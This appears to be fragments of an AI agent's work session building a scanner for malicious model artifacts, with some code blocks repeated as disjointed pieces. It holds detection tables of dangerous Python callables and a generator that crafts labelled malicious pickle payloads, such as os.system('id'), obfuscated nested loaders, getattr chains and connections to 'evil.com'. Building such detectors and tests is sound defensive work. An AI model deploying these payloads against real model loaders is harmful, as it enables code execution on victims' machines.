print("torch legacy magic int:", 0x1950a86a20f9469cfc6c, "== sample?", 0x1950a86a20f9469cfc6c==119547037146038801333356)
# INST / OBJ / EXT representation
def ops(b):
    print("  bytes:", b)
    for op,arg,pos in pickletools.genops(b):
        print("   ",pos,op.name,repr(arg))
# protocol 0 INST: 'i' module\nname\n ; build via raw
print("INST raw:")
ops(b"(S'touch x'\nios\nsystem\n.")
print("OBJ raw:")
# o: push callable via c, then args, then o over mark
ops(b"(cos\nsystem\nS'x'\no.")
print("GLOBAL c:")
ops(b"cos\nsystem\n(S'x'\ntR.")
print("BYTEARRAY8 / proto5:")
ops(pickle.dumps(bytearray(b"abc"), protocol=5))
print("compat IMPORT sample:", list(_compat_pickle.IMPORT_MAPPING.items())[:6])
print("has commands:", _compat_pickle.IMPORT_MAPPING.get("commands"), "urllib2:", _compat_pickle.IMPORT_MAPPING.get("urllib2"), "httplib:", _compat_pickle.IMPORT_MAPPING.get("httplib"))
print("NAME unicode:", _compat_pickle.NAME_MAPPING.get(("__builtin__","unicode")))
print("NAME sample:", list(_compat_pickle.NAME_MAPPING.items())[:6])
EOF

arguments.content:
"""What the scanner looks for, as data tables.

The policy (see /app/docs/threat-model.md) is defined by *capabilities*, not
names: an artifact is malicious when loading it, or calling a function it
exports, would (A) execute attacker code, (B) start a process, (C) touch a
file outside the artifact, or (D) open a network connection.

For pickles this module provides the canonical tables the abstract
interpreter in ``pklvm`` consults; for TensorFlow and Keras the op/marker
tables the respective scanners use.
"""
from __future__ import annotations

import _compat_pickle

# Finding kinds (must match report-schema.md).
CODE = "code-execution"
PROC = "process"
FILE = "file-access"
NET = "network"

# --------------------------------------------------------------------------
# Module aliasing.  The unpickler maps Python-2 names back with fix_imports
# (the _compat_pickle tables) and several C modules are the same object as
# their public name.  ``posix``/``nt`` *are* ``os``; ``_io`` *is* ``io``.
# --------------------------------------------------------------------------
MODULE_ALIASES = dict(_compat_pickle.IMPORT_MAPPING)
MODULE_ALIASES.update({
    "posix": "os",
    "nt": "os",
    "ce": "os",
    "_io": "io",
    "_pickle": "pickle",
    "cPickle": "pickle",
    "StringIO": "io",
    "cStringIO": "io",
    "_socket": "socket",
    "_ssl": "ssl",
    "_functools": "functools",
    "_operator": "operator",
    "_collections": "collections",
    "_thread": "_thread",
    "thread": "_thread",
    "dumbdbm": "dbm.dumb",
})

# (module, name) -> (module, name) for specific Python-2 renames.
NAME_ALIASES = dict(_compat_pickle.NAME_MAPPING)

# A handful of "<module>.<attr> is itself a module" facts, used when a dotted
# GLOBAL/getattr chain is walked (``shutil.os`` is ``os``).
SUBMODULE_ALIASES = {
    ("shutil", "os"): "os",
    ("shutil", "sys"): "sys",
    ("os", "path"): "os.path",
    ("numpy", "testing"): "numpy.testing",
}


def alias_module(module: str) -> str:
    seen = set()
    while module in MODULE_ALIASES and module not in seen:
        seen.add(module)
        module = MODULE_ALIASES[module]
    return module


# --------------------------------------------------------------------------
# Capability callables.  A *call* of any of these is a finding of the given
# kind, no matter how the loader reached it.  Keys are canonical dotted paths
# ("os.system", "pathlib.Path.write_text", "socket.socket.connect").  Unbound
# methods appear as the callable when an attacker writes
# ``(socket.socket.connect, (sock, addr))`` in a __reduce__.
# --------------------------------------------------------------------------
_CODE = [
    "builtins.eval", "builtins.exec", "builtins.compile",
    "builtins.execfile", "builtins.breakpoint",
    "runpy.run_path", "runpy.run_module", "runpy._run_code", "runpy._run_module_code",
    "timeit.timeit", "timeit.repeat",
    "code.InteractiveInterpreter.runsource", "code.InteractiveInterpreter.runcode",
    "code.interact",
    "bdb.Bdb.run", "bdb.Bdb.runeval", "bdb.Bdb.runcall",
    "pdb.run", "pdb.runeval", "pdb.runcall", "pdb.Pdb.run",
    "numpy.testing._private.utils.runstring",
    "logging.config.dictConfig", "logging.config.fileConfig",
    "yaml.load", "yaml.unsafe_load", "yaml.full_load",
    "asyncio.base_events.BaseEventLoop.run_in_executor",
]
_PROC = [
    "os.system", "os.popen", "os.popen2", "os.popen3", "os.popen4", "os.startfile",
    "os.execl", "os.execle", "os.execlp", "os.execlpe",
    "os.execv", "os.execve", "os.execvp", "os.execvpe",
    "os.spawnl", "os.spawnle", "os.spawnlp", "os.spawnlpe",
    "os.spawnv", "os.spawnve", "os.spawnvp", "os.spawnvpe",
    "os.posix_spawn", "os.posix_spawnp",
    "subprocess.Popen", "subprocess.call", "subprocess.run",
    "subprocess.check_call", "subprocess.check_output",
    "subprocess.getoutput", "subprocess.getstatusoutput",
    "pty.spawn", "pty.fork",
    "pydoc.pipepager", "pydoc.tempfilepager",
    "posix.system",  # survives even without fix_imports on Linux
]
_FILE = [
    "builtins.open", "io.open", "io.FileIO", "os.open", "os.fdopen",
    "os.remove", "os.unlink", "os.rename", "os.renames", "os.replace",
    "os.mkdir", "os.makedirs", "os.rmdir", "os.removedirs", "os.truncate",
    "os.chmod", "os.chown", "os.link", "os.symlink", "os.mknod",
    "shutil.copy", "shutil.copy2", "shutil.copyfile", "shutil.copyfileobj",
    "shutil.copytree", "shutil.move", "shutil.rmtree",
    "shutil.make_archive", "shutil.unpack_archive",
    "tempfile.NamedTemporaryFile", "tempfile.TemporaryFile",
    "tempfile.mkstemp", "tempfile.mkdtemp", "tempfile.mktemp",
    "fileinput.input", "fileinput.FileInput",
    "codecs.open", "dbm.open", "gzip.open", "bz2.open", "lzma.open",
    "aiofiles.open",
]
_NET = [
    "socket.create_connection", "socket.create_server",
    "socket.socket.connect", "socket.socket.connect_ex", "socket.socket.sendto",
    "urllib.request.urlopen", "urllib.request.urlretrieve",
    "urllib.request.URLopener.open", "urllib.request.URLopener.retrieve",
    "urllib.request.OpenerDirector.open", "urllib.request.FancyURLopener.open",
    "http.client.HTTPConnection.connect", "http.client.HTTPConnection.request",
    "http.client.HTTPSConnection.connect", "http.client.HTTPSConnection.request",
    "ftplib.FTP.connect", "ftplib.FTP.login", "ftplib.FTP_TLS.connect",
    "smtplib.SMTP.connect", "poplib.POP3.user", "imaplib.IMAP4.open",
    "ssl.get_server_certificate", "ssl.SSLContext.wrap_socket",
    "webbrowser.open", "webbrowser.open_new", "webbrowser.open_new_tab",
    "requests.get", "requests.post", "requests.put", "requests.head",
    "requests.request", "requests.api.request",
    "requests.Session.get", "requests.Session.post", "requests.Session.request",
    "antigravity",  # opens a browser on import/use
]

CAP: dict[str, str] = {}
for _p in _CODE:
    CAP[_p] = CODE
for _p in _PROC:
    CAP[_p] = PROC
for _p in _FILE:
    CAP[_p] = FILE
for _p in _NET:
    CAP[_p] = NET

# pathlib bound-method capabilities, for every concrete Path flavour.
for _cls in ("Path", "PosixPath", "WindowsPath", "PurePath", "PurePosixPath", "PureWindowsPath"):
    for _m, _k in (
        ("write_text", FILE), ("write_bytes", FILE), ("read_text", FILE),
        ("read_bytes", FILE), ("open", FILE), ("unlink", FILE), ("rename", FILE),
        ("replace", FILE), ("rmdir", FILE), ("mkdir", FILE), ("touch", FILE),
        ("chmod", FILE), ("symlink_to", FILE), ("hardlink_to", FILE),
    ):
        CAP[f"pathlib.{_cls}.{_m}"] = _k

# --------------------------------------------------------------------------
# Network *constructors* that connect only when given a host argument.
# ``ftplib.FTP()`` opens nothing; ``ftplib.FTP("host")`` connects.
# --------------------------------------------------------------------------
NETCTOR = {
    "ftplib.FTP", "ftplib.FTP_TLS",
    "smtplib.SMTP", "smtplib.SMTP_SSL", "smtplib.LMTP",
    "poplib.POP3", "poplib.POP3_SSL",
    "imaplib.IMAP4", "imaplib.IMAP4_SSL",
    "telnetlib.Telnet",
    "nntplib.NNTP", "nntplib.NNTP_SSL",
}

# --------------------------------------------------------------------------
# Nested loaders: calling one is a finding only when what it would load is a
# finding.  Judged by the argument -- embedded bytes are analysed, a path is
# a file read, an unknown argument fails closed.
# --------------------------------------------------------------------------
LOADER_PICKLE = {
    "pickle.loads", "pickle.load", "_pickle.loads", "_pickle.load",
    "pickle.Unpickler.load", "dill.loads", "dill.load",
    "cloudpickle.loads", "cloudpickle.load",
    "joblib.load", "joblib.numpy_pickle.load",
    "pandas.read_pickle", "pandas.io.pickle.read_pickle",
}
LOADER_NUMPY = {
    "numpy.load", "numpy.lib.format.read_array",
    "numpy.lib.npyio.load", "numpy.lib._npyio_impl.read_array",
}
LOADER_TORCH = {
    "torch.load", "torch.storage._load_from_bytes", "torch.jit.load",
    "torch.serialization.load",
}
LOADER_MARSHAL = {"marshal.loads", "marshal.load"}

ALL_LOADERS = LOADER_PICKLE | LOADER_NUMPY | LOADER_TORCH | LOADER_MARSHAL

# --------------------------------------------------------------------------
# Enablers: carry no capability of their own, but are the route to one.
# --------------------------------------------------------------------------
ENABLERS = {
    "builtins.getattr": "getattr",
    "builtins.setattr": "setattr",
    "operator.attrgetter": "attrgetter",
    "operator.methodcaller": "methodcaller",
    "functools.partial": "partial",
    "functools.partialmethod": "partial",
    "builtins.__import__": "import",
    "importlib.import_module": "import",
    "importlib.__import__": "import",
    "importlib._bootstrap._gcd_import": "import",
    "pkgutil.resolve_name": "resolve_name",
    "operator.call": "call",
    "builtins.apply": "call",
    "functools.reduce": "reduce",
    "builtins.map": "map",
    "builtins.filter": "filter",
    "itertools.starmap": "map",
    "functools.lru_cache": "identity",
    "functools.cache": "identity",
    "copy.copy": "identity",
    "copy.deepcopy": "identity",
}

# Callables that consume a lazy map/filter (and so run its function).
CONSUMERS = {
    "builtins.list", "builtins.tuple", "builtins.set", "builtins.frozenset",
    "builtins.dict", "builtins.sorted", "builtins.min", "builtins.max",
    "builtins.sum", "builtins.any", "builtins.all", "builtins.next",
    "builtins.str.join", "collections.deque", "functools.reduce",
    "itertools.chain", "builtins.list.extend",
}

# Constant-folding transforms, so embedded payloads assembled before a nested
# load are judged after assembly (base64/zlib/hex/concatenation/bytearray).
TRANSFORMS = {
    "base64.b64decode", "base64.standard_b64decode", "base64.urlsafe_b64decode",
    "base64.b16decode", "base64.b32decode", "base64.b85decode", "base64.a85decode",
    "base64.decodebytes",
    "binascii.unhexlify", "binascii.a2b_base64", "binascii.a2b_hex",
    "zlib.decompress", "gzip.decompress", "bz2.decompress", "lzma.decompress",
    "codecs.decode", "codecs.encode", "_codecs.decode", "_codecs.encode",
    "builtins.bytes", "builtins.bytearray", "builtins.bytes.fromhex",
    "operator.add", "operator.concat", "operator.iadd",
    "builtins.str", "builtins.bytes.decode", "builtins.str.encode",
}

# --------------------------------------------------------------------------
# TensorFlow op table (closed; see threat-model section 4).
# --------------------------------------------------------------------------
TF_OPS = {}
for _op in ("PyFunc", "PyFuncStateless", "EagerPyFunc"):
    TF_OPS[_op] = CODE
for _op in (
    "ReadFile", "WriteFile", "MatchingFiles", "MatchingFilesDataset",
    "ImmutableConst", "WholeFileReader", "WholeFileReaderV2",
    "TextLineReader", "TextLineReaderV2", "FixedLengthRecordReader",
    "FixedLengthRecordReaderV2", "TFRecordReader", "TFRecordReaderV2",
    "LMDBReader", "LMDBDataset", "ExperimentalLMDBDataset",
    "TextLineDataset", "TFRecordDataset", "FixedLengthRecordDataset",
    "DatasetToTFRecord", "ExperimentalDatasetToTFRecord",
    "SaveDataset", "SaveDatasetV2", "LoadDataset",
    "SnapshotDataset", "SnapshotDatasetV2",
    "LoadAndRemapMatrix", "GenerateVocabRemapping",
    "Save", "SaveSlices", "Restore", "RestoreSlice",
):
    TF_OPS[_op] = FILE
for _op in (
    "DataServiceDataset", "DataServiceDatasetV2", "DataServiceDatasetV3",
    "DataServiceDatasetV4", "RegisterDataset", "RegisterDatasetV2",
    "DistributedSave",
):
    TF_OPS[_op] = NET

# Node attributes that reference a function in the graph's function library.
TF_FUNC_ATTR_OPS = {
    "If", "StatelessIf", "While", "StatelessWhile", "Case",
    "PartitionedCall", "StatefulPartitionedCall", "MapDefun", "For",
}

"""What the scanner looks for, as data tables.

The policy (see /app/docs/threat-model.md) is defined by *capabilities*, not
names: an artifact is malicious when loading it, or calling a function it
exports, would (A) execute attacker code, (B) start a process, (C) touch a
file outside the artifact, or (D) open a network connection.

For pickles this module provides the canonical tables the abstract
interpreter in ``pklvm`` consults; for TensorFlow and Keras the op/marker
tables the respective scanners use.
"""

    "posix": "os",
    "nt": "os",
    "ce": "os",
    "_io": "io",
    "_pickle": "pickle",
    "cPickle": "pickle",
    "StringIO": "io",
    "cStringIO": "io",
    "_socket": "socket",
    "_ssl": "ssl",
    "_functools": "functools",
    "_operator": "operator",
    "_collections": "collections",
    "_thread": "_thread",
    "thread": "_thread",
    "dumbdbm": "dbm.dumb",
})

# (module, name) -> (module, name) for specific Python-2 renames.
NAME_ALIASES = dict(_compat_pickle.NAME_MAPPING)

# A handful of "<module>.<attr> is itself a module" facts, used when a dotted
# GLOBAL/getattr chain is walked (``shutil.os`` is ``os``).
SUBMODULE_ALIASES = {
    ("shutil", "os"): "os",
    ("shutil", "sys"): "sys",
    ("os", "path"): "os.path",
    ("numpy", "testing"): "numpy.testing",
}

    seen = set()
    while module in MODULE_ALIASES and module not in seen:
        seen.add(module)
        module = MODULE_ALIASES[module]
    return module

    "code.interact",

]

    "os.execl", "os.execle", "os.execlp", "os.execlpe",

"""What the scanner looks for, as data tables.

The policy (see /app/docs/threat-model.md) is defined by *capabilities*, not
names: an artifact is malicious when loading it, or calling a function it
exports, would (A) execute attacker code, (B) start a process, (C) touch a
file outside the artifact, or (D) open a network connection.

For pickles this module provides the canonical tables the abstract
interpreter in ``pklvm`` consults; for TensorFlow and Keras the op/marker
tables the respective scanners use.
"""

NET = "network"

# --------------------------------------------------------------------------
# Module aliasing.  The unpickler maps Python-2 names back with fix_imports
# (the _compat_pickle tables) and several C modules are the same object as
# their public name.  ``posix``/``nt`` *are* ``os``; ``_io`` *is* ``io``.
# --------------------------------------------------------------------------
MODULE_ALIASES = dict(_compat_pickle.IMPORT_MAPPING)
MODULE_ALIASES.update({
    "posix": "os",
    "nt": "os",
    "ce": "os",
    "_io": "io",
    "_pickle": "pickle",
    "cPickle": "pickle",
    "StringIO": "io",

    while module in MODULE_ALIASES and module not in seen:

"""Keras HDF5 scanning: Lambda layers in the model configuration."""
from __future__ import annotations

import json

from modelgate.report import Finding


def scan_h5(path: str, location: str) -> list[Finding]:
    import h5py  # lazy: only needed for Keras files

    with h5py.File(path, "r") as fh:
        raw = fh.attrs.get("model_config")
    if raw is None:
        return []
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8")
    config = json.loads(raw)
    findings: list[Finding] = []
    for i, layer in enumerate(config.get("config", {}).get("layers", [])):
        if layer.get("class_name") == "Lambda":
            findings.append(Finding("code-execution", f"{location}:layers[{i}]", "Lambda layer"))
    return findings

import os

from modelgate.policy import TF_OPS
from modelgate.report import Finding

_MAX_PB = 256 * 1024 * 1024


def scan_saved_model_dir(path: str):
    pb = os.path.join(path, "saved_model.pb")
    pbtxt = os.path.join(path, "saved_model.pbtxt")
    if os.path.isfile(pb):
        try:
            with open(pb, "rb") as fh:
                data = fh.read(_MAX_PB + 1)
            if len(data) > _MAX_PB:
                return [Finding("unsupported", "saved_model.pb", "SavedModel proto too large to scan")]
            return _scan_binary(data)
        except Exception as exc:  # noqa: BLE001
            return [Finding("unsupported", "saved_model.pb", f"could not parse SavedModel: {exc}")]
    if os.path.isfile(pbtxt):
        try:
            with open(pbtxt, "r", encoding="utf-8", errors="replace") as fh:
                text = fh.read()
            return _scan_text(text)
        except Exception as exc:  # noqa: BLE001
            return [Finding("unsupported", "saved_model.pbtxt", f"could not parse SavedModel: {exc}")]

def _load_proto(parse):
    from modelgate.tfproto import saved_model_pb2
    sm = saved_model_pb2.SavedModel()
    parse(sm)
    return sm


def _scan_binary(data):
    sm = _load_proto(lambda m: m.ParseFromString(data))
    return _scan_saved_model(sm)


def _scan_text(text):
    from google.protobuf import text_format
    sm = _load_proto(lambda m: text_format.Parse(text, m))
    return _scan_saved_model(sm)


def _scan_saved_model(sm):
    findings: list[Finding] = []
    for mi, mg in enumerate(sm.meta_graphs):
        graph = mg.graph_def
        for node in graph.node:
            _check_op(node.op, f"meta_graph[{mi}].node[{node.name}]", findings)
        for fi, func in enumerate(graph.library.function):
            fname = func.signature.name or str(fi)
            for node in func.node_def:
                _check_op(node.op, f"meta_graph[{mi}].function[{fname}].node[{node.name}]", findings)
    return findings


def _check_op(op, location, findings):
    kind = TF_OPS.get(op)
    if kind:
        findings.append(Finding(kind, location, f"op {op}"))

import os, sys, json, struct, io

# ---- raw pickle opcode emitters (mix protocols freely; no PROTO required) ----
def gmod(mod, name): return b'c' + mod.encode() + b'\n' + name.encode() + b'\n'
def inst(mod, name): return b'i' + mod.encode() + b'\n' + name.encode() + b'\n'
def su(s):
    b = s.encode()
    assert len(b) < 256
    return b'\x8c' + bytes([len(b)]) + b
def sb(b):
    assert len(b) < 256
    return b'C' + bytes([len(b)]) + b
MARK=b'('; TUP=b't'; T1=b'\x85'; T2=b'\x86'; T3=b'\x87'; ET=b')'
RED=b'R'; STOP=b'.'; EMPTY_D=b'}'; SETITEM=b's'; SETITEMS=b'u'
EMPTY_L=b']'; APPEND=b'a'; APPENDS=b'e'; MEMO=b'\x94'; POP=b'0'; BUILD=b'b'
def bput(i): return b'q'+bytes([i])
def bget(i): return b'h'+bytes([i])
def stack_global(mod,name): return su(mod)+su(name)+b'\x93'

def call(mod, name, *strargs):
    out = gmod(mod,name) + MARK
    for a in strargs: out += su(a)
    return out + TUP + RED

def dump(path, data):
    with open(path,'wb') as f: f.write(data)

cases = {}  # name -> (bytes, label)

# 1. direct os.system
cases['m_os_system'] = (call('os','system','id'), 'malicious')
# 2. subprocess.Popen
cases['m_subproc_popen'] = (gmod('subprocess','Popen')+MARK+EMPTY_L+su('sh')+APPEND+TUP+RED+STOP, 'malicious')
# 3. subprocess.run
cases['m_subproc_run'] = (call('subprocess','run','whoami'), 'malicious')
# 4. builtins.eval
cases['m_eval'] = (call('builtins','eval','1+1'), 'malicious')
# 5. builtins.exec
cases['m_exec'] = (call('builtins','exec','x=1'), 'malicious')
# 6. builtins.open (file)
cases['m_open'] = (gmod('builtins','open')+MARK+su('/etc/x')+su('w')+TUP+RED+STOP, 'malicious')
# 7. urllib urlopen (net)
cases['m_urlopen'] = (call('urllib.request','urlopen','http://x'), 'malicious')
# 8. socket.create_connection
cases['m_create_conn'] = (gmod('socket','create_connection')+MARK+MARK+su('h')+su('1')+TUP+TUP+RED+STOP, 'malicious')

# --- python2 aliases ---
cases['m_alias_builtin_eval'] = (call('__builtin__','eval','1'), 'malicious')
cases['m_alias_posix_system'] = (call('posix','system','id'), 'malicious')
cases['m_alias_nt_system'] = (call('nt','system','id'), 'malicious')
cases['m_alias_commands_getoutput'] = (call('commands','getoutput','id'), 'malicious')  # ->subprocess.getoutput
cases['m_alias_urllib2'] = (call('urllib2','urlopen','http://x'), 'malicious')
cases['m_alias_httplib'] = (gmod('httplib','HTTPConnection.request')+MARK+su('GET')+TUP+RED+STOP, 'malicious')  # ->http.client

# --- text / INST / OBJ ---
cases['m_inst_os_system'] = (MARK+su('id')+inst('os','system')+STOP, 'malicious')
cases['m_obj_os_system'] = (MARK+gmod('os','system')+su('id')+b'o'+STOP, 'malicious')
cases['m_inst_popen'] = (MARK+su('sh')+inst('subprocess','Popen')+STOP, 'malicious')

# --- getattr chain ---
getr = gmod('builtins','getattr')+ (gmod('importlib','import_module')+MARK+su('os')+TUP+RED) + su('system') + T2 + RED + MARK+su('id')+TUP+RED+STOP
cases['m_getattr_chain'] = (getr, 'malicious')
# attrgetter
ag = gmod('operator','attrgetter')+MARK+su('system')+TUP+RED + MARK + (gmod('importlib','import_module')+MARK+su('os')+TUP+RED) + TUP + RED + MARK+su('id')+TUP+RED + STOP
cases['m_attrgetter'] = (ag, 'malicious')
# methodcaller
mc = gmod('operator','methodcaller')+MARK+su('system')+su('id')+TUP+RED + MARK + (gmod('importlib','import_module')+MARK+su('os')+TUP+RED) + TUP + RED + STOP
cases['m_methodcaller'] = (mc, 'malicious')
# partial then called via operator.call
pc = gmod('operator','call')+MARK + (gmod('functools','partial')+MARK+gmod('os','system')+su('id')+TUP+RED) + TUP + RED + STOP
cases['m_partial_call'] = (pc, 'malicious')

# --- memo: global memoized then retrieved and called ---
memo = gmod('os','system')+bput(5)+POP + MARK + bget(5) + su('id') + TUP + RED + STOP
cases['m_memo_call'] = (memo, 'malicious')

# --- second stream smuggling ---
two = (su('harmless')+STOP) + call('os','system','id') + STOP
cases['m_second_stream'] = (two, 'malicious')

# --- nested loaders ---
inner = call('os','system','id')+STOP
cases['m_pickle_loads_b64'] = None
import base64, zlib, binascii
b64 = base64.b64encode(inner)
nl = gmod('pickle','loads')+MARK+ (gmod('base64','b64decode')+MARK+sb(b64)+TUP+RED) +TUP+RED+STOP
cases['m_pickle_loads_b64'] = (nl, 'malicious')
nlz = gmod('pickle','loads')+MARK+ (gmod('zlib','decompress')+MARK+sb(zlib.compress(inner))+TUP+RED) +TUP+RED+STOP
cases['m_pickle_loads_zlib'] = (nlz, 'malicious')
hexed = binascii.hexlify(inner).decode()
nlh = gmod('pickle','loads')+MARK+ (gmod('builtins','bytes.fromhex')+MARK+su(hexed)+TUP+RED) +TUP+RED+STOP
cases['m_pickle_loads_hex'] = (nlh, 'malicious')
# direct bytes to pickle.loads
nld = gmod('pickle','loads')+MARK+sb(inner)+TUP+RED+STOP
cases['m_pickle_loads_direct'] = (nld, 'malicious')
# nested loader fed BENIGN bytes -> clean
benign_inner = su('hello')+STOP
nlb = gmod('pickle','loads')+MARK+sb(benign_inner)+TUP+RED+STOP
cases['c_pickle_loads_benign'] = (nlb, 'clean')
# nested loader fed a PATH -> file access
nlp = gmod('joblib','load')+MARK+su('/etc/passwd')+TUP+RED+STOP
cases['m_joblib_load_path'] = (nlp, 'malicious')
# marshal.loads
cases['m_marshal'] = (gmod('marshal','loads')+MARK+sb(b'xx')+TUP+RED+STOP, 'malicious')

# --- pathlib unbound method ---
cases['m_pathlib_write'] = (gmod('pathlib','Path.write_text')+MARK+su('/tmp/x')+su('data')+TUP+RED+STOP, 'malicious')
cases['m_pathlib_posix_unlink'] = (gmod('pathlib','PosixPath.unlink')+ET+RED+STOP, 'malicious')
# socket method unbound
cases['m_socket_connect'] = (gmod('socket','socket.connect')+MARK+su('x')+TUP+RED+STOP, 'malicious')
cases['m_http_request'] = (gmod('http.client','HTTPConnection.request')+MARK+su('GET')+TUP+RED+STOP, 'malicious')

# --- netctor with host (malicious) vs without (clean) ---
cases['m_ftp_host'] = (gmod('ftplib','FTP')+MARK+su('evil.com')+TUP+RED+STOP, 'malicious')
cases['c_ftp_nohost'] = (gmod('ftplib','FTP')+ET+RED+STOP, 'clean')
cases['m_smtp_host'] = (gmod('smtplib','SMTP')+MARK+su('mail.evil')+TUP+RED+STOP, 'malicious')
cases['c_smtp_nohost'] = (gmod('smtplib','SMTP')+ET+RED+STOP, 'clean')
# socket.socket() construct no connect -> clean
cases['c_socket_ctor'] = (gmod('socket','socket')+ET+RED+STOP, 'clean')
# HTTPConnection(host,port) construct -> clean (opens nothing)
cases['c_httpconn_ctor'] = (gmod('http.client','HTTPConnection')+MARK+su('h')+su('80')+TUP+RED+STOP, 'clean')
# xmlrpc ServerProxy -> clean
cases['c_xmlrpc'] = (gmod('xmlrpc.client','ServerProxy')+MARK+su('http://x')+TUP+RED+STOP, 'clean')

# --- code exec variants ---
cases['m_runpy'] = (call('runpy','run_path','/x.py'), 'malicious')
cases['m_logging_dictconfig'] = (gmod('logging.config','dictConfig')+EMPTY_D+T1+RED+STOP, 'malicious')
cases['m_timeit'] = (call('timeit','timeit','x'), 'malicious')
cases['m_bdb'] = (gmod('bdb','Bdb.run')+MARK+su('code')+TUP+RED+STOP, 'malicious')

# --- map consumed vs not ---
mapc = gmod('builtins','list')+MARK+ (gmod('builtins','map')+MARK+gmod('os','system')+(EMPTY_L+su('id')+APPEND)+TUP+RED) +TUP+RED+STOP
cases['m_map_consumed'] = (mapc, 'malicious')
mapn = EMPTY_D+MARK+su('k')+ (gmod('builtins','map')+MARK+gmod('os','system')+(EMPTY_L+su('id')+APPEND)+TUP+RED) +SETITEM+STOP
cases['c_map_not_consumed'] = (mapn, 'clean')
# reduce(os.system, seq)
redc = gmod('functools','reduce')+MARK+gmod('os','system')+(EMPTY_L+su('a')+APPEND)+TUP+RED+STOP
cases['m_functools_reduce'] = (redc, 'malicious')

# --- persid semantics in plain pickle ---
# dangerous reduce AFTER binpersid -> load stops at persid -> clean
after = su('pid')+b'Q' + call('os','system','id') + STOP   # Q=BINPERSID
cases['c_persid_before_payload'] = (after, 'clean')
# dangerous reduce BEFORE persid -> executes -> malicious
before = call('os','system','id') + su('pid')+b'Q' + STOP
cases['m_payload_before_persid'] = (before, 'malicious')

# --- capability stored as data, never called -> clean ---
stored = EMPTY_D+MARK+su('fn')+gmod('os','system')+su('fn2')+gmod('subprocess','Popen')+SETITEMS+STOP
cases['c_stored_as_data'] = (stored, 'clean')
# memoized never called
memn = gmod('os','system')+bput(3)+POP+su('ok')+STOP
cases['c_memoized_uncalled'] = (memn, 'clean')
# itemgetter (clean)
cases['c_itemgetter'] = (gmod('operator','itemgetter')+MARK+su('a')+TUP+RED+STOP, 'clean')
# os.fspath (clean)
cases['c_fspath'] = (call('os','fspath','/x'), 'clean')
# string containing os.system as data
cases['c_string_data'] = (EMPTY_D+MARK+su('cmd')+su("os.system('id')")+su('note')+su('subprocess.Popen')+SETITEMS+STOP, 'clean')
# getattr to benign attr then nothing
cases['c_getattr_benign'] = (gmod('builtins','getattr')+MARK+gmod('collections','OrderedDict')+su('fromkeys')+TUP+RED+STOP, 'clean')

# write all
labels={}
for name,(data,label) in cases.items():
    p = f'/tmp/advtest/cases/{name}.pkl'
    dump(p, data)
    labels[name]=label
with open('/tmp/advtest/labels_pkl.json','w') as f: json.dump(labels,f,indent=1)
print("wrote", len(cases), "pickle cases")

#!/usr/bin/env python3
"""ModelGate command line.

    python3 -I /app/modelgate/cli.py scan --output <report.json> <path> [<path> ...]

Writes one JSON report (see /app/docs/report-schema.md) and exits 0 once it
is written; exits 2 on a usage error.  ``-I`` keeps the script directory off
sys.path, so the package directory's parent is added explicitly below.
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modelgate import __version__  # noqa: E402
from modelgate import dispatch  # noqa: E402
from modelgate.report import Finding, Result, to_json  # noqa: E402


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(prog="modelgate", description="static scanner for model artifacts")
    parser.add_argument("--version", action="version", version=f"modelgate {__version__}")
    sub = parser.add_subparsers(dest="command", required=True)
    scan = sub.add_parser("scan", help="scan one or more artifacts")
    scan.add_argument("--output", required=True, help="where to write the JSON report")
    scan.add_argument("paths", nargs="+", help="artifact files, or SavedModel directories")
    try:
        args = parser.parse_args(argv)
    except SystemExit as exc:
        return 2 if exc.code else 0

    results = []
    for path in args.paths:
        try:
            results.append(dispatch.scan_path(path))
        except Exception as exc:  # noqa: BLE001 - a crash must still yield a verdict
            results.append(Result(path, [Finding("unsupported", path, f"scanner error: {type(exc).__name__}: {exc}")]))
    with open(args.output, "w", encoding="utf-8") as fh:
        fh.write(to_json(results))
    return 0


if __name__ == "__main__":
    sys.exit(main())

#!/usr/bin/env python3
"""ModelGate command line.

    python3 -I /app/modelgate/cli.py scan --output <report.json> <path> [<path> ...]

Writes one JSON report (see /app/docs/report-schema.md) and exits 0 once it
is written; exits 2 on a usage error.  ``-I`` keeps the script directory off
sys.path, so the package directory's parent is added explicitly below.
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modelgate import __version__  # noqa: E402
from modelgate import dispatch  # noqa: E402
from modelgate.report import Finding, Result, to_json  # noqa: E402


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(prog="modelgate", description="static scanner for model artifacts")
    parser.add_argument("--version", action="version", version=f"modelgate {__version__}")
    sub = parser.add_subparsers(dest="command", required=True)
    scan = sub.add_parser("scan", help="scan one or more artifacts")
    scan.add_argument("--output", required=True, help="where to write the JSON report")
    scan.add_argument("paths", nargs="+", help="artifact files, or SavedModel directories")
    try:
        args = parser.parse_args(argv)
    except SystemExit as exc:
        return 2 if exc.code else 0

    results = []
    for path in args.paths:
        try:
            results.append(dispatch.scan_path(path))
        except Exception as exc:  # noqa: BLE001 - a crash must still yield a verdict
            results.append(Result(path, [Finding("unsupported", path, f"scanner error: {type(exc).__name__}: {exc}")]))
    with open(args.output, "w", encoding="utf-8") as fh:
        fh.write(to_json(results))
    return 0


if __name__ == "__main__":
    sys.exit(main())

arguments.command:
cat > /tmp/advtest/gen3.py <<'PYEOF'
import os, json, io, pickle
OUT="/tmp/advtest/cases3"; os.makedirs(OUT, exist_ok=True)
labels={}
def gmod(m,n): return b'c'+m.encode()+b'\n'+n.encode()+b'\n'
def su(s):
    b=s.encode(); return b'\x8c'+bytes([len(b)])+b
MARK=b'(';TUP=b't';T1=b'\x85';RED=b'R';STOP=b'.';PROTO=b'\x80\x04';ET=b')';NONE=b'N';BUILD=b'b'
def w(name,label,data): open(os.path.join(OUT,name),"wb").write(PROTO+data); labels[name]=label

# partial retargeted via BUILD(__setstate__), then invoked
partial_create = gmod('functools','partial')+MARK+gmod('os','fspath')+TUP+RED
state = MARK + gmod('os','system') + (MARK+su('id')+TUP) + NONE + NONE + TUP
retarget = state + BUILD
w("m_partial_retarget","malicious", partial_create + retarget + ET + RED + STOP)

# pkgutil.resolve_name('os.system')('id')
rn = (gmod('pkgutil','resolve_name')+MARK+su('os.system')+TUP+RED) + MARK+su('id')+TUP+RED+STOP
w("m_resolve_name","malicious", rn)
# resolve_name with colon form 'os:system'
